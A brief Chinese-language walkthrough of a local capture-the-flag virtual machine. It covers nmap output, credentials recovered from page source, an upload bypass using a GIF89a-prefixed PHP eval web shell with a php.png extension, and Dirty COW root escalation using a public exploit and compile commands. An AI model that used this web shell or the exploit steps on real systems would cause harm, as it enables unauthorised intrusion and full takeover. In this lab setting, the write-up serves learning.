## nmap

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-27 15:56 CST
Nmap scan report for 192.168.137.141
Host is up (0.00054s latency).
Not shown: 989 filtered tcp ports (no-response), 10 filtered tcp ports (host-prohibited)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|storage-misc|media device|webcam
Running (JUST GUESSING): Linux 2.6.X|3.X|4.X (97%), Drobo embedded (89%), Synology DiskStation Manager 5.X (89%), LG embedded (88%), Tandberg embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/h:drobo:5n cpe:/a:synology:diskstation_manager:5.2
Aggressive OS guesses: Linux 2.6.32 - 3.10 (97%), Linux 2.6.32 - 3.13 (97%), Linux 2.6.39 (94%), Linux 2.6.32 - 3.5 (92%), Linux 3.2 (91%), Linux 3.2 - 3.16 (91%), Linux 3.2 - 3.8 (91%), Linux 2.6.32 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.9 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.54 ms 192.168.137.141

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.61 seconds
```

## web渗透

测试到有/firsti目录是管理员登录页面

读源码得到账号密码

```
eezeepz
keKkeKKeKKeKkEkkEk
```

一句话木马文件上传

```
GIF89a

<?php @eval($_POST[cmd]); ?>
```

bp抓包修改后缀为php.png

然后蚁剑连接进行提权

## 提权

脏牛提权

利用探针脚本检测存在的漏洞

git clone https://github.com/mzet-/linux-exploit-suggester

使用脏牛提权

https://github.com/firefart/dirtycow.git

```
gcc -pthread dirty.c -o dirty -lcrypt
./dirty my-new-password
```

要求在ttr环境下

使用python更改环境

```
python -c 'import pty:pty.spawn("/bin/bash")'
```

脏牛脚本创建的root用户为firefart 密码为自己创建的，为my-new-password